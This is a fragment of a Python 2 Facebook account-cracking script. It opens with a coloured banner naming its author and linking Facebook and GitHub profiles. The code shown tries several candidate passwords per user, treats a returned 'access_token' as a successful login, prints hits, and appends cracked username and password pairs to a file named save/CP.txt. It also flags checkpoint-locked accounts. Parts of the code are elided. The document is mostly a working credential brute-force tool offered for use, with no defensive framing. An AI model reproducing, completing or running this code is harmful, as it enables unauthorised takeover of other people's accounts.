...
\x1b[1;96m__________________________________________________________________________
\x1b[1;96m\033[1;96mAuthor   :            RANA RAJPOOT
\x1b[1;96m\033[1;96mFacebook :           https://www.facebook.com/profile.php?id=100004930324743
\x1b[1;96m\033[1;96mGitHub   :            https://github.com/Usman132/RANA-RAJPOOT.git
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;96m  [RAJPOOT_OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m  [R AJPOOT_CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [RAJPOOT_OK] ' + k + c + user + '  |  ' + pass2
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [RAJPOOT_OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
